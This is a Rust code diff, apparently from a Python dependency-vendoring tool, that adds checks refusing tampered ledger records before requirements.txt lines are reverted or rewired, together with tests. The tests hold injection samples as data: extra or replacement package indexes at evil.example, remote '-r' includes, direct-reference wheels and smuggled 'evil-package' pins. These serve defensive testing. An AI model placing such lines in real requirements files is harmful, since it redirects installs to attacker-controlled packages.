@@ -885,7 +885,17 @@ pub(super) async fn revert_requirements(
         let mut edits: Vec<(usize, &WiringRecord)> = Vec::new();
         for (rec, idx) in recs.iter().zip(pair_recorded_lines(&lines, &recorded)) {
             match idx {
-                Some(idx) => edits.push((idx, rec)),
+                // The paired line is about to be replaced by the recorded
+                // text: both must be the edit vendoring makes (nothing has
+                // been written yet).
+                Some(idx) => match ledger_record_refusal(entry, rec) {
+                    Some(why) => {
+                        return RevertOutcome::failed(super::state::refused_record(
+                            entry, rec, &why,
+                        ))
+                    }
+                    None => edits.push((idx, rec)),
+                },
                 None => warnings.push(drift_warning(file, rec)),
             }
         }
@@ -947,6 +957,96 @@ pub(super) async fn revert_requirements(
         warnings,
         error: None,
     }
+}
+
+/// Why a `requirements_line` record may not name `file`
+/// ([`super::state::wiring_refusal`]). The planner edits the root
+/// `requirements.txt` and the in-root `-r` includes it reaches
+/// ([`collect_requirements_files`]); a file that has since left that tree
+/// still holds the line vendoring wrote into it, so one named like a
+/// requirements file is accepted too. Anything else — a config, a script, a
+/// workflow — is not a file a vendor line can sit in.
+pub(super) async fn ledger_file_refusal(root: &Path, file: &str) -> Option<String> {
+    if file == crate::formats::governing_locks::PYPI_REQUIREMENTS {
+        return None;
+    }
+    let reached = requirements_include_names(root).await.unwrap_or_default();
+    let name = file.rsplit('/').next().unwrap_or(file);
+    let plausible = requirements_file_name(name) && !file.starts_with(".socket/");
+    (!reached.iter().any(|rel| rel == file) && !plausible).then(|| {
+        "names a file that is neither the project's requirements.txt, one of the `-r` includes \
+         it reaches, nor a *.txt / *.in requirements file"
+            .to_string()
+    })
+}
+
+/// Why a `requirements_line` record is not the edit [`plan_requirements`]
+/// makes for `entry`: it turns ONE exact `name==version` pin into this
+/// patch's vendored-wheel line, or appends that line. The ledger is
+/// committed, so a checkout can carry any ledger: before a recorded line
+/// is spliced over a live one ([`revert_requirements`], [`plan_rewire`]),
+/// the line it replaces must be this patch's own wheel line, and what it
+/// puts back must be that one pin (its marker, its `--hash` options and
+/// its continuation lines included) — never another package, an option
+/// line, an include or a direct reference.
+fn ledger_record_refusal(entry: &VendorEntry, rec: &WiringRecord) -> Option<String> {
+    let purl = crate::utils::purl::strip_purl_qualifiers(&entry.base_purl);
+    let Some((name, version)) = crate::utils::purl::parse_pypi_purl(purl) else {
+        return Some("belongs to an entry that names no PyPI release".to_string());
+    };
+    let canon = canonicalize_pypi_name(&name);
+    // A record with no vendor line pairs with nothing: the revert leaves it
+    // alone as drift.
+    let new = rec.new.as_ref().and_then(serde_json::Value::as_str)?;
+    let wheel = strip_comment(new).split_whitespace().next();
+    let ours = !new.contains(['\n', '\r'])
+        && wheel.is_some_and(|token| {
+            super::path::parse_vendor_path(token)
+                .is_some_and(|parts| parts.eco == "pypi" && parts.uuid == entry.uuid)
+                && super::lock_inventory::pypi::socket_reference_coords(token)
+                    .is_some_and(|(wheel_name, _)| wheel_name == canon)
+        });
+    if !ours {
+        return Some(format!(
+            "replaces a line that is not this patch's vendored {canon} wheel line \
+             (./.socket/vendor/pypi/{}/…)",
+            entry.uuid
+        ));
+    }
+    // An appended line is deleted, and so is a rewritten one that recorded
+    // nothing to put back.
+    let original = match (rec.action, rec.original.as_ref()) {
+        (WiringAction::Added, _) | (WiringAction::Rewritten, None) => return None,
+        (WiringAction::Rewritten, Some(original)) => original,
+    };
+    let lines: Option<Vec<&str>> = original
+        .as_array()
+        .and_then(|lines| lines.iter().map(serde_json::Value::as_str).collect());
+    let mut text = String::new();
+    for line in lines.as_deref().unwrap_or_default() {
+        // A recorded line keeps its own ending when it differs from its
+        // span's ([`recorded_span`]).
+        let body = line
+            .strip_suffix("\r\n")
+            .or_else(|| line.strip_suffix('\n'))
+            .unwrap_or(line);
+        if body.contains(['\n', '\r']) {
+            text.clear();
+            break;
+        }
+        text.push_str(body);
+        text.push('\n');
+    }
+    let scan = scan_pins(&text, &canon, &version);
+    let one_pin = logical_lines(&text).len() == 1
+        && scan.exact.len() == 1
+        && !(scan.extras || scan.range || scan.other_branches || scan.templated);
+    (!one_pin).then(|| {
+        format!(
+            "puts back text that is not the one `{canon}=={version}` requirement vendoring \
+             replaced"
+        )
+    })
 }
 
 fn drift_warning(file: &str, rec: &WiringRecord) -> VendorWarning {
@@ -1289,6 +1389,11 @@ fn plan_rewire(
             let old = old.ok_or_else(|| format!("{rel}: a recorded vendor line is empty"))?;
             let idx =
                 idx.ok_or_else(|| format!("{rel}: the vendor line changed since vendoring"))?;
+            // The record's original is carried into the new entry and its
+            // line is rewritten here: it must be the edit vendoring makes.
+            if let Some(why) = ledger_record_refusal(prev, rec) {
+                return Err(format!("{rel}: the ledger record {why}"));
+            }
             let marker = vendor_line_marker(split_comment(old).0);
             let line = vendor_line(
                 rel_wheel,
@@ -2731,7 +2836,11 @@ mod tests {
                 "idna==3.7\r\n./{newer}  # socket-patch vendor: six==1.16.0\nrequests==2.31.0\r\n"
             )
         );
-        let outcome = revert_requirements(&entry_for(rewired), tmp.path(), false).await;
+        let superseding = VendorEntry {
+            uuid: OTHER_UUID.into(),
+            ..entry_for(rewired)
+        };
+        let outcome = revert_requirements(&superseding, tmp.path(), false).await;
         assert!(outcome.success, "{:?}", outcome.error);
         assert!(outcome.warnings.is_empty(), "{:?}", outcome.warnings);
         assert_eq!(read_root(tmp.path()).await, original);
@@ -3322,6 +3431,161 @@ mod tests {
         );
     }
 
+    /// One `requirements_line` record replacing `new` with `original`.
+    fn rewritten(new: &str, original: &[&str]) -> WiringRecord {
+        WiringRecord {
+            file: "requirements.txt".into(),
+            kind: RECORD_KIND.into(),
+            action: WiringAction::Rewritten,
+            key: Some("requirements.txt:2".into()),
+            original: Some(serde_json::json!(original)),
+            new: Some(serde_json::json!(new)),
+        }
+    }
+
+    /// What a record may replace and put back: this patch's own wheel line,
+    /// and the ONE exact pin it replaced, however that pin was written.
+    #[test]
+    fn a_ledger_record_is_the_vendor_line_and_the_pin_it_replaced() {
+        let line = vendor_line(REL_WHEEL, Some(SHA), "six", "1.16.0", &None, false);
+        let entry = entry_for(Vec::new());
+        for original in [
+            vec!["six==1.16.0"],
+            vec!["Six == 1.16"],
+            vec!["six==1.16.0 ; python_version >= \"3\"  # keep -r nothing"],
+            vec![
+                "six==1.16.0 \\",
+                "    --hash=sha256:aaaa \\",
+                "    --hash=sha256:bbbb",
+            ],
+            // An inner line that kept its own ending (#1567).
+            vec!["six==1.16.0 \\\r\n", "    --hash=sha256:aaaa"],
+        ] {
+            assert_eq!(
+                ledger_record_refusal(&entry, &rewritten(&line, &original)),
+                None,
+                "{original:?}"
+            );
+        }
+        for original in [
+            vec![
+                "six==1.16.0",
+                "--extra-index-url https://evil.example/simple",
+            ],
+            vec!["six==1.16.0", "evil-package==6.6.6"],
+            vec!["six==1.16.0\nevil-package==6.6.6"],
+            vec!["# just a comment", "six==1.16.0"],
+            vec!["evil-package==6.6.6"],
+            vec!["six @ https://evil.example/six-1.16.0-py2.py3-none-any.whl"],
+            vec!["-r https://evil.example/requirements.txt"],
+            vec!["--index-url https://evil.example/simple"],
+            vec!["six==1.16.0 --config-settings=--build-option=x"],
+            vec!["six==1.15.0"],
+            vec!["six>=1.0"],
+            vec!["six[extra]==1.16.0"],
+            vec!["six==${SIX}"],
+            vec![],
+        ] {
+            let refusal = ledger_record_refusal(&entry, &rewritten(&line, &original));
+            assert!(refusal.is_some(), "{original:?}");
+        }
+        // The line it replaces is this patch's wheel line and nothing else.
+        let other_patch = line.replace(UUID, OTHER_UUID);
+        let other_package = line.replace("six-1.16.0", "idna-3.7");
+        for new in [
+            "idna==3.7",
+            "[core]",
+            other_patch.as_str(),
+            other_package.as_str(),
+            "./.socket/vendor/pypi/not-a-uuid/six-1.16.0-py2.py3-none-any.whl",
+            &format!("{line}\n--index-url https://evil.example/simple"),
+        ] {
+            let refusal = ledger_record_refusal(&entry, &rewritten(new, &["six==1.16.0"]));
+            assert!(refusal.is_some(), "{new}");
+        }
+        // An appended line is only ever deleted, a missing vendor line
+        // pairs with nothing.
+        let mut added = rewritten(&line, &[]);
+        added.action = WiringAction::Added;
+        added.original = None;
+        assert_eq!(ledger_record_refusal(&entry, &added), None);
+        added.new = None;
+        assert_eq!(ledger_record_refusal(&entry, &added), None);
+    }
+
+    /// A record that is not the vendor edit fails the revert before
+    /// anything is written — the file's other vendor lines included.
+    #[tokio::test]
+    async fn revert_refuses_a_record_that_is_not_the_vendor_edit() {
+        let original = "idna==3.7\nsix==1.16.0\n";
+        let tmp = write_root(original).await;
+        let wiring = wire_requirements(tmp.path(), "six", "1.16.0", REL_WHEEL, SHA)
+            .await
+            .unwrap();
+        let wired = read_root(tmp.path()).await;
+
+        // What it would put back is not the pin.
+        let mut poisoned = wiring.clone();
+        poisoned[0].original = Some(serde_json::json!([
+            "six==1.16.0",
+            "--extra-index-url https://evil.example/simple"
+        ]));
+        // What it would replace is the user's own line.
+        let mut aimed = wiring.clone();
+        aimed.push(rewritten(
+            "idna==3.7",
+            &["idna @ https://evil.example/idna.whl"],
+        ));
+        for tampered in [poisoned, aimed] {
+            for dry_run in [true, false] {
+                let outcome =
+                    revert_requirements(&entry_for(tampered.clone()), tmp.path(), dry_run).await;
+                assert!(!outcome.success);
+                let error = outcome.error.unwrap_or_default();
+                assert!(error.contains("ledger record"), "{error}");
+                assert_eq!(read_root(tmp.path()).await, wired, "nothing is written");
+            }
+        }
+        // The untouched ledger still reverts exactly.
+        let outcome = revert_requirements(&entry_for(wiring), tmp.path(), false).await;
+        assert!(outcome.success, "{:?}", outcome.error);
+        assert_eq!(read_root(tmp.path()).await, original);
+    }
+
+    /// The file a record names is one the planner edits: the root file, an
+    /// include it reaches, or (for one since unhooked) a file named like a
+    /// requirements file.
+    #[tokio::test]
+    async fn a_ledger_record_names_a_requirements_file() {
+        let tmp = write_root("-r deps/base.pip\nsix==1.16.0\n").await;
+        tokio::fs::create_dir_all(tmp.path().join("deps"))
+            .await
+            .unwrap();
+        tokio::fs::write(tmp.path().join("deps/base.pip"), "idna==3.7\n")
+            .await
+            .unwrap();
+        for file in [
+            "requirements.txt",
+            "deps/base.pip",
+            "requirements/dev.txt",
+            "constraints.in",
+        ] {
+            assert_eq!(ledger_file_refusal(tmp.path(), file).await, None, "{file}");
+        }
+        for file in [
+            ".github/workflows/ci.yml",
+            "manage.py",
+            "deps/other.pip",
+            "setup.cfg",
+            ".socket/vendor/pypi/notes.txt",
+        ] {
+            assert!(
+                ledger_file_refusal(tmp.path(), file).await.is_some(),
+                "{file}"
+            );
+        }
+    }
+
     #[tokio::test]
     async fn revert_warns_on_drifted_line_and_leaves_it() {
         let tmp = write_root("six==1.16.0\n").await;
@@ -3585,7 +3849,11 @@ mod tests {
                 format!("idna==3.7\n./{newer}  # socket-patch vendor: six==1.16.0\n"),
                 "{edit}"
             );
-            let outcome = revert_requirements(&entry_for(rewired), tmp.path(), false).await;
+            let superseding = VendorEntry {
+                uuid: OTHER_UUID.into(),
+                ..entry_for(rewired)
+            };
+            let outcome = revert_requirements(&superseding, tmp.path(), false).await;
             assert!(outcome.success, "{edit}: {:?}", outcome.error);
             assert!(
                 outcome.warnings.is_empty(),
